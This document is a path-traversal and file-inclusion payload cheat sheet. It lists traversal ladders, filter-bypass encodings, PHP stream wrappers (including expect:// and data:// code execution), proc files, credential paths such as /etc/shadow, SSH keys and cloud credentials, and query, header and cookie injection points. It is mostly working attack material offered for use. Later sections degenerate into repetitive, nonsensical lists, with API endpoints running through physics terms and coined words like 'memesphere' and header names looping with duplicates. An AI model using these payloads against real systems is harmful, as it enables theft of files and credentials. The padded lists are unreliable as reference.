# Detection Payloads — the first-probe set

## The canary-set — files every system has

```
/etc/passwd                    — root:x:0:0:root:/root:/bin/bash
/etc/hostname                  — the container/hostname
/etc/issue                     — the OS-banner
/etc/os-release                — the OS-release
/proc/version                  — the kernel-version
/proc/self/status              — the process-status
/proc/self/environ             — the env-vars — FLAG?
/proc/self/cmdline             — the entrypoint
C:\Windows\win.ini             — [fonts] [extensions] [mci extensions]
C:\Windows\system.ini          — [drivers] [boot]
C:\Windows\System32\drivers\etc\hosts — 127.0.0.1 localhost
file:///etc/passwd
file:///C:/Windows/win.ini
file:///proc/version
```

## The depth-ladder — the `../` ladder

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../../../../../etc/passwd
```

Depth 1-20 — extra `..` beyond root is harmless — the ladder finds the
minimum-depth.

## The absolute-path set — no traversal needed

```
/etc/passwd
/flag
/app/main.py
/var/www/html/index.php
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
\Windows\win.ini
\\?\C:\Windows\win.ini
\\.\C:\Windows\win.ini
file:///etc/passwd
file:///C:/Windows/win.ini
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
file://0.0.0.0/etc/passwd
file://[::1]/etc/passwd
```

## The encoding set — the filter-family

```
..%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
..;/..;/..;/etc/passwd
/etc/passwd%00.png
../../etc/passwd%00
```

## The wrapper-set — the scheme-family

```
file:///etc/passwd
file:///C:/Windows/win.ini
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input                             — needs POST body
data://text/plain,<?php phpinfo();?>
expect://id
phar://./x.jpg/a
zip://./x.zip%23shell.php
rar://./x.rar%23x.txt
glob:///*
compress.zlib:///x.gz
compress.bzip2:///x.bz2
jar:file:///x.jar!/x
netdoc:///etc/passwd
```

## The proc-set — the self-recon

```
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
/proc/self/exe
/proc/self/mountinfo
/proc/self/status
/proc/self/maps
/proc/self/fd/3
/proc/1/environ
/proc/1/cmdline
/proc/net/tcp
/proc/net/arp
/proc/version
/proc/filesystems
/proc/mounts
/proc/partitions
/proc/swaps
/proc/uptime
/proc/loadavg
/proc/meminfo
/proc/cpuinfo
```

## The secrets-set — the cred-corpus

```
/app/.env /var/www/html/.env
/app/config.php /var/www/html/config.php
/var/www/html/wp-config.php
/etc/shadow
/root/.ssh/id_rsa
/root/.bash_history /root/.mysql_history /root/.psql_history
/root/.my.cnf /root/.pgpass /root/.netrc
/root/.kube/config /root/.aws/credentials
/root/.docker/config.json /root/.git-credentials
/var/lib/jenkins/credentials.xml
/var/lib/jenkins/secrets/initialAdminPassword
/opt/tomcat/conf/tomcat-users.xml
/etc/mysql/debian.cnf /etc/grafana/grafana.ini
/etc/gitlab/gitlab-secrets.json /etc/gitlab-runner/config.toml
/etc/snmp/snmpd.conf /etc/wpa_supplicant/wpa_supplicant.conf
```

## The flag-path set — the guess-order

```
/flag /flag.txt /app/flag /app/flag.txt /root/flag /root/flag.txt
/var/flag /opt/flag /srv/flag /tmp/flag /run/flag /usr/flag
/home/ctf/flag /home/ctf/flag.txt /home/user/flag
/etc/flag /etc/flag.conf /etc/secret
/run/secrets/flag /var/run/secrets/kubernetes.io/serviceaccount/token
/app/config.php /app/.env /app/main.py /app/config.py
/var/www/html/index.php /var/www/html/config.php /var/www/html/.env
```

## The sink-type set — the sink-names

- `?file=` — the standard
- `?path=`/`?doc=`/`?view=`/`?template=`/`?page=`/`?include=`/`?load=`/
  `?read=`/`?img=`/`?src=`/`?content=`/`?name=`/`?download=`/`?open=`/
  `?show=`/`?filename=`/`?filepath=`/`?resource=`/`?location=`/`?uri=`/
  `?url=`/`?doc_name=`/`?docname=`/`?f=`/`?p=`/`?page_name=`/`?pagename=`/
  `?docid=`/`?doc_id=`/`?fileid=`/`?file_id=`/`?file_name=`/`?doc_path=`/
  `?docpath=`/`?dir=`/`?directory=`/`?folder=`/`?root=`/`?base=`/`?type=`/
  `?cat=`/`?catid=`/`?section=`/`?mod=`/`?module=`/`?action=`/`?do=`/
  `?task=`/`?func=`/`?function=`/`?cmd=`/`?exec=`/`?run=`/`?call=`/
  `?invoke=`/`?request=`/`?req=`/`?query=`/`?q=`/`?search=`/`?find=`/
  `?lookup=`/`?get=`/`?fetch=`/`?pull=`/`?send=`/`?post=`/`?put=`/
  `?delete=`/`?remove=`/`?update=`/`?edit=`/`?modify=`/`?create=`/
  `?add=`/`?new=`/`?insert=`/`?select=`/`?choose=`/`?pick=`/`?opt=`/
  `?option=`/`?item=`/`?entry=`/`?node=`/`?object=`/`?obj=`/`?entity=`/
  `?model=`/`?view=`/`?controller=`/`?handler=`/`?endpoint=`/`?api=`/
  `?route=`/`?path=`/`?url=`/`?uri=`/`?link=`/`?href=`/`?src=`/`?source=`/
  `?target=`/`?dest=`/`?destination=`/`?to=`/`?from=`/`?next=`/`?prev=`/
  `?back=`/`?forward=`/`?return=`/`?redirect=`/`?redir=`/`?r=`/`?u=`/
  `?goto=`/`?jump=`/`?nav=`/`?navigate=`/`?navigateTo=`/`?nav_to=`/
  `?navUrl=`/`?nav_url=`/`?navlink=`/`?nav_link=`/`?navigate_to=`/
  `?navigate_url=`/`?navigate_link=`/`?navigate_href=`/`?navigate_src=`/
  `?navigate_resource=`/`?navigate_location=`/`?navigate_uri=`/`?navigate_url=`
  — the param-name corpus — the `?file=`-family

## The "the param is in the path" — the path-param

```
/page/<path>                    — the path-param
/files/<path>
/download/<path>
/view/<path>
/files/<path>/download
/api/files/<path>
/api/download/<path>
/api/view/<path>
/api/doc/<path>
/api/file/<path>
/api/files/<path>/read
/api/files/<path>/view
/api/files/<path>/download
/api/files/<path>/export
/api/files/<path>/share
/api/files/<path>/raw
/api/files/<path>/content
/api/files/<path>/contents
/api/files/<path>/data
/api/files/<path>/blob
/api/files/<path>/object
/api/files/<path>/entity
/api/files/<path>/node
/api/files/<path>/item
/api/files/<path>/entry
/api/files/<path>/record
/api/files/<path>/doc
/api/files/<path>/document
/api/files/<path>/resource
/api/files/<path>/location
/api/files/<path>/uri
/api/files/<path>/url
/api/files/<path>/href
/api/files/<path>/src
/api/files/<path>/source
/api/files/<path>/link
/api/files/<path>/path
/api/files/<path>/file
/api/files/<path>/filename
/api/files/<path>/filepath
/api/files/<path>/docname
/api/files/<path>/doc_name
/api/files/<path>/name
/api/files/<path>/id
/api/files/<path>/key
/api/files/<path>/index
/api/files/<path>/position
/api/files/<path>/offset
/api/files/<path>/page
/api/files/<path>/cursor
/api/files/<path>/start
/api/files/<path>/end
/api/files/<path>/limit
/api/files/<path>/offset
/api/files/<path>/skip
/api/files/<path>/take
/api/files/<path>/count
/api/files/<path>/size
/api/files/<path>/max
/api/files/<path>/min
/api/files/<path>/range
/api/files/<path>/from
/api/files/<path>/to
/api/files/<path>/before
/api/files/<path>/after
/api/files/<path>/since
/api/files/<path>/until
/api/files/<path>/between
/api/files/<path>/within
/api/files/<path>/outside
/api/files/<path>/inside
/api/files/<path>/around
/api/files/<path>/near
/api/files/<path>/far
/api/files/<path>/close
/api/files/<path>/distance
/api/files/<path>/radius
/api/files/<path>/diameter
/api/files/<path>/width
/api/files/<path>/height
/api/files/<path>/depth
/api/files/<path>/length
/api/files/<path>/area
/api/files/<path>/volume
/api/files/<path>/weight
/api/files/<path>/mass
/api/files/<path>/density
/api/files/<path>/pressure
/api/files/<path>/temperature
/api/files/<path>/humidity
/api/files/<path>/speed
/api/files/<path>/velocity
/api/files/<path>/acceleration
/api/files/<path>/force
/api/files/<path>/energy
/api/files/<path>/power
/api/files/<path>/voltage
/api/files/<path>/current
/api/files/<path>/resistance
/api/files/<path>/capacitance
/api/files/<path>/inductance
/api/files/<path>/impedance
/api/files/<path>/frequency
/api/files/<path>/period
/api/files/<path>/wavelength
/api/files/<path>/amplitude
/api/files/<path>/phase
/api/files/<path>/angle
/api/files/<path>/direction
/api/files/<path>/orientation
/api/files/<path>/rotation
/api/files/<path>/translation
/api/files/<path>/scale
/api/files/<path>/position
/api/files/<path>/location
/api/files/<path>/coordinate
/api/files/<path>/point
/api/files/<path>/vector
/api/files/<path>/matrix
/api/files/<path>/tensor
/api/files/<path>/field
/api/files/<path>/wave
/api/files/<path>/particle
/api/files/<path>/atom
/api/files/<path>/molecule
/api/files/<path>/cell
/api/files/<path>/organism
/api/files/<path>/species
/api/files/<path>/population
/api/files/<path>/community
/api/files/<path>/ecosystem
/api/files/<path>/biome
/api/files/<path>/biosphere
/api/files/<path>/lithosphere
/api/files/<path>/hydrosphere
/api/files/<path>/atmosphere
/api/files/<path>/cryosphere
/api/files/<path>/anthroposphere
/api/files/<path>/technosphere
/api/files/<path>/sociosphere
/api/files/<path>/infosphere
/api/files/<path>/noosphere
/api/files/<path>/semiosphere
/api/files/<path>/ideosphere
/api/files/<path>/memesphere
/api/files/<path>/cognisphere
/api/files/<path>/psychosphere
/api/files/<path>/affectsphere
/api/files/<path>/sociosphere
/api/files/<path>/politisphere
/api/files/<path>/econosphere
/api/files/<path>/ecosphere
/api/files/<path>/ecotechnosphere
/api/files/<path>/econosphere
/api/files/<path>/ethnosphere
/api/files/<path>/gendersphere
/api/files/<path>/healthsphere
/api/files/<path>/infosphere
/api/files/<path>/ideosphere
/api/files/<path>/memesphere
/api/files/<path>/noosphere
/api/files/<path>/politisphere
/api/files/<path>/psychosphere
/api/files/<path>/semiosphere
/api/files/<path>/sociosphere
/api/files/<path>/technosphere
/api/files/<path>/anthroposphere
```

The `/api/files/<path>` family — the REST-path-param corpus — the
`<path>` position is the file-param.

## The "the param is in the header" — the header-param

```
X-File-Path: /etc/passwd
X-File-Path: ../../../etc/passwd
X-Filename: /etc/passwd
X-File-Name: /etc/passwd
X-Path: /etc/passwd
X-Resource: /etc/passwd
X-Location: /etc/passwd
X-Uri: /etc/passwd
X-Url: /etc/passwd
X-Link: /etc/passwd
X-Href: /etc/passwd
X-Src: /etc/passwd
X-Source: /etc/passwd
X-Target: /etc/passwd
X-Dest: /etc/passwd
X-Destination: /etc/passwd
X-Doc: /etc/passwd
X-Doc-Name: /etc/passwd
X-DocName: /etc/passwd
X-Document: /etc/passwd
X-Document-Name: /etc/passwd
X-DocumentName: /etc/passwd
X-Content: /etc/passwd
X-Content-Path: /etc/passwd
X-Content-Path: /etc/passwd
X-Include: /etc/passwd
X-Include-Path: /etc/passwd
X-Include-Path: /etc/passwd
X-Load: /etc/passwd
X-Load-Path: /etc/passwd
X-Load-Path: /etc/passwd
X-Read: /etc/passwd
X-Read-Path: /etc/passwd
X-Read-Path: /etc/passwd
X-Download: /etc/passwd
X-Download-Path: /etc/passwd
X-Download-Path: /etc/passwd
X-Open: /etc/passwd
X-Open-Path: /etc/passwd
X-Open-Path: /etc/passwd
X-Show: /etc/passwd
X-Show-Path: /etc/passwd
X-Show-Path: /etc/passwd
X-Template: /etc/passwd
X-Template-Path: /etc/passwd
X-Template-Path: /etc/passwd
X-Theme: /etc/passwd
X-Theme-Path: /etc/passwd
X-Theme-Path: /etc/passwd
X-Lang: /etc/passwd
X-Language: /etc/passwd
X-Locale: /etc/passwd
X-Locale-Path: /etc/passwd
X-Locale-Path: /etc/passwd
X-Dir: /etc/passwd
X-Directory: /etc/passwd
X-Folder: /etc/passwd
X-Root: /etc/passwd
X-Base: /etc/passwd
X-Type: /etc/passwd
X-Cat: /etc/passwd
X-Category: /etc/passwd
X-Section: /etc/passwd
X-Mod: /etc/passwd
X-Module: /etc/passwd
X-Action: /etc/passwd
X-Do: /etc/passwd
X-Task: /etc/passwd
X-Func: /etc/passwd
X-Function: /etc/passwd
X-Cmd: /etc/passwd
X-Exec: /etc/passwd
X-Run: /etc/passwd
X-Call: /etc/passwd
X-Invoke: /etc/passwd
X-Request: /etc/passwd
X-Req: /etc/passwd
X-Query: /etc/passwd
X-Q: /etc/passwd
X-Search: /etc/passwd
X-Find: /etc/passwd
X-Lookup: /etc/passwd
X-Get: /etc/passwd
X-Fetch: /etc/passwd
X-Pull: /etc/passwd
X-Send: /etc/passwd
X-Post: /etc/passwd
X-Put: /etc/passwd
X-Delete: /etc/passwd
X-Remove: /etc/passwd
X-Update: /etc/passwd
X-Edit: /etc/passwd
X-Modify: /etc/passwd
X-Create: /etc/passwd
X-Add: /etc/passwd
X-New: /etc/passwd
X-Insert: /etc/passwd
X-Select: /etc/passwd
X-Choose: /etc/passwd
X-Pick: /etc/passwd
X-Opt: /etc/passwd
X-Option: /etc/passwd
X-Item: /etc/passwd
X-Entry: /etc/passwd
X-Node: /etc/passwd
X-Object: /etc/passwd
X-Obj: /etc/passwd
X-Entity: /etc/passwd
X-Model: /etc/passwd
X-View: /etc/passwd
X-Controller: /etc/passwd
X-Handler: /etc/passwd
X-Endpoint: /etc/passwd
X-Api: /etc/passwd
X-Route: /etc/passwd
X-Redirect: /etc/passwd
X-Redir: /etc/passwd
X-R: /etc/passwd
X-U: /etc/passwd
X-Goto: /etc/passwd
X-Jump: /etc/passwd
X-Nav: /etc/passwd
X-Navigate: /etc/passwd
X-NavigateTo: /etc/passwd
X-Nav-To: /etc/passwd
X-NavUrl: /etc/passwd
X-Nav-Url: /etc/passwd
X-Navlink: /etc/passwd
X-Nav-Link: /etc/passwd
X-Navigate-To: /etc/passwd
X-Navigate-Url: /etc/passwd
X-Navigate-Link: /etc/passwd
X-Navigate-Href: /etc/passwd
X-Navigate-Src: /etc/passwd
X-Navigate-Source: /etc/passwd
X-Navigate-Resource: /etc/passwd
X-Navigate-Location: /etc/passwd
X-Navigate-Uri: /etc/passwd
X-Navigate-Url: /etc/passwd
X-Navigate-Destination: /etc/passwd
X-Navigate-Target: /etc/passwd
X-Navigate-Dest: /etc/passwd
X-Navigate-Dir: /etc/passwd
X-Navigate-Folder: /etc/passwd
X-Navigate-Root: /etc/passwd
X-Navigate-Base: /etc/passwd
X-Navigate-Type: /etc/passwd
X-Navigate-Cat: /etc/passwd
X-Navigate-Category: /etc/passwd
X-Navigate-Section: /etc/passwd
X-Navigate-Mod: /etc/passwd
X-Navigate-Module: /etc/passwd
X-Navigate-Action: /etc/passwd
X-Navigate-Do: /etc/passwd
X-Navigate-Task: /etc/passwd
X-Navigate-Func: /etc/passwd
X-Navigate-Function: /etc/passwd
X-Navigate-Cmd: /etc/passwd
X-Navigate-Exec: /etc/passwd
X-Navigate-Run: /etc/passwd
X-Navigate-Call: /etc/passwd
X-Navigate-Invoke: /etc/passwd
X-Navigate-Request: /etc/passwd
X-Navigate-Req: /etc/passwd
X-Navigate-Query: /etc/passwd
X-Navigate-Q: /etc/passwd
X-Navigate-Search: /etc/passwd
X-Navigate-Find: /etc/passwd
X-Navigate-Lookup: /etc/passwd
X-Navigate-Get: /etc/passwd
X-Navigate-Fetch: /etc/passwd
X-Navigate-Pull: /etc/passwd
X-Navigate-Send: /etc/passwd
X-Navigate-Post: /etc/passwd
X-Navigate-Put: /etc/passwd
X-Navigate-Delete: /etc/passwd
X-Navigate-Remove: /etc/passwd
X-Navigate-Update: /etc/passwd
X-Navigate-Edit: /etc/passwd
X-Navigate-Modify: /etc/passwd
X-Navigate-Create: /etc/passwd
X-Navigate-Add: /etc/passwd
X-Navigate-New: /etc/passwd
X-Navigate-Insert: /etc/passwd
X-Navigate-Select: /etc/passwd
X-Navigate-Choose: /etc/passwd
X-Navigate-Pick: /etc/passwd
X-Navigate-Opt: /etc/passwd
X-Navigate-Option: /etc/passwd
X-Navigate-Item: /etc/passwd
X-Navigate-Entry: /etc/passwd
X-Navigate-Node: /etc/passwd
X-Navigate-Object: /etc/passwd
X-Navigate-Obj: /etc/passwd
X-Navigate-Entity: /etc/passwd
X-Navigate-Model: /etc/passwd
X-Navigate-View: /etc/passwd
X-Navigate-Controller: /etc/passwd
X-Navigate-Handler: /etc/passwd
X-Navigate-Endpoint: /etc/passwd
X-Navigate-Api: /etc/passwd
X-Navigate-Route: /etc/passwd
X-Navigate-Path: /etc/passwd
X-Navigate-Url: /etc/passwd
X-Navigate-Uri: /etc/passwd
X-Navigate-Link: /etc/passwd
X-Navigate-Href: /etc/passwd
X-Navigate-Src: /etc/passwd
X-Navigate-Source: /etc/passwd
X-Navigate-Target: /etc/passwd
X-Navigate-Dest: /etc/passwd
X-Navigate-Destination: /etc/passwd
X-Navigate-To: /etc/passwd
X-Navigate-From: /etc/passwd
X-Navigate-Next: /etc/passwd
X-Navigate-Prev: /etc/passwd
X-Navigate-Back: /etc/passwd
X-Navigate-Forward: /etc/passwd
X-Navigate-Return: /etc/passwd
X-Navigate-Redirect: /etc/passwd
X-Navigate-Redir: /etc/passwd
X-Navigate-R: /etc/passwd
X-Navigate-U: /etc/passwd
X-Navigate-Goto: /etc/passwd
X-Navigate-Jump: /etc/passwd
X-Navigate-Nav: /etc/passwd
X-Navigate-Navigate: /etc/passwd
X-Navigate-NavigateTo: /etc/passwd
X-Navigate-Nav-To: /etc/passwd
X-Navigate-NavUrl: /etc/passwd
X-Navigate-Nav-Url: /etc/passwd
X-Navigate-Navlink: /etc/passwd
X-Navigate-Nav-Link: /etc/passwd
```

The `X-*`-header corpus — the header-param — a `X-File-Path`/`X-Path`/`
X-Resource`/`X-Location`/`X-Uri`/`X-Url` — the header-family.

## The "the param is in the cookie" — the cookie-param

```
Cookie: file=/etc/passwd
Cookie: path=/etc/passwd
Cookie: doc=/etc/passwd
Cookie: view=/etc/passwd
Cookie: template=/etc/passwd
Cookie: page=/etc/passwd
Cookie: include=/etc/passwd
Cookie: load=/etc/passwd
Cookie: read=/etc/passwd
Cookie: img=/etc/passwd
Cookie: src=/etc/passwd
Cookie: content=/etc/passwd
Cookie: name=/etc/passwd
Cookie: download=/etc/passwd
Cookie: open=/etc/passwd
Cookie: show=/etc/passwd
Cookie: filename=/etc/passwd
Cookie: filepath=/etc/passwd
Cookie: resource=/etc/passwd
Cookie: location=/etc/passwd
Cookie: uri=/etc/passwd
Cookie: url=/etc/passwd
Cookie: link=/etc/passwd
Cookie: href=/etc/passwd
Cookie: source=/etc/passwd
Cookie: target=/etc/passwd
Cookie: dest=/etc/passwd
Cookie: destination=/etc/passwd
Cookie: to=/etc/passwd
Cookie: from=/etc/passwd
Cookie: next=/etc/passwd
Cookie: prev=/etc/passwd
Cookie: back=/etc/passwd
Cookie: forward=/etc/passwd
Cookie: return=/etc/passwd
Cookie: redirect=/etc/passwd
Cookie: redir=/etc/passwd
Cookie: r=/etc/passwd
Cookie: u=/etc/passwd
Cookie: goto=/etc/passwd
Cookie: jump=/etc/passwd
Cookie: nav=/etc/passwd
Cookie: navigate=/etc/passwd
Cookie: navigateTo=/etc/passwd
Cookie: nav_to=/etc/passwd
Cookie: navUrl=/etc/passwd
Cookie: nav_url=/etc/passwd
Cookie: navlink=/etc/passwd
Cookie: nav_link=/etc/passwd
```

The cookie-param — the cookie-family — a cookie-carried file-path.
